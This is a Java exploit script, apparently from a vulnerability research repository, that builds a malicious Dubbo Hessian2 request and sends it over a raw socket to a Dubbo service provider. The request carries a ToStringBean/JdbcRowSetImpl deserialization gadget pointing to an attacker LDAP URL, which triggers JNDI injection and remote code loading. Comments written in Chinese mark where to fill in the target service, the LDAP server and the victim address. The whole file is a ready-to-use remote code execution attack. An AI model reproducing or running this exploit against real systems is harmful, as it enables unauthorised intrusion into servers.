package top.lz2y.vul;

import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import top.lz2y.tools.Reflections;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

/**
 * description: Bypass1
 */
public class Bypass1 {
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        out.writeUTF("2.7.8");
        //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
        out.writeUTF("");
        out.writeUTF("1.0");
        out.writeUTF("$echo");
        //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
        out.writeUTF("Ljava/lang/Object;");
        out.writeObject("foo");

        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        //todo 此处填写ldap url
        rs.setDataSourceName("ldap://127.0.0.1:8087/Exploit");
        rs.setMatchColumn("foo");
        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        HashMap attachments = new HashMap();
        attachments.put("pwn", item);
        out.writeObject(attachments);

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("192.168.137.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
